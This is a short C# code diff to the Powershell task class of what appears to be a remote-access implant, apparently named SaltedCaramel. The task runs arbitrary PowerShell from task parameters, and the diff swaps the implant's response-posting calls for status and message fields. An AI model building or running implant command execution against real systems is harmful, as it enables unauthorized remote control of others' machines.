@@ -7,7 +7,7 @@ namespace SaltedCaramel.Tasks
 {
     class Powershell
     {
-        internal static void Execute(SCTask task, SCImplant implant)
+        internal static void Execute(SCTaskObject task)
         {
             string args = task.@params;
 
@@ -15,14 +15,13 @@ namespace SaltedCaramel.Tasks
             {
                 string result = Shell.PowerShellExecute(args);
 
-                SCTaskResp response = new SCTaskResp(task.id, JsonConvert.SerializeObject(result));
-                implant.PostResponse(response);
-                implant.SendComplete(task.id);
+                task.status = "complete";
+                task.message = JsonConvert.SerializeObject(result);
             }
             catch (Exception e)
             {
                 Debug.WriteLine("[!] Powershell - ERROR: " + e.Message);
-                implant.SendError(task.id, e.Message);
+                task.message = e.Message;
             }
         }
     }
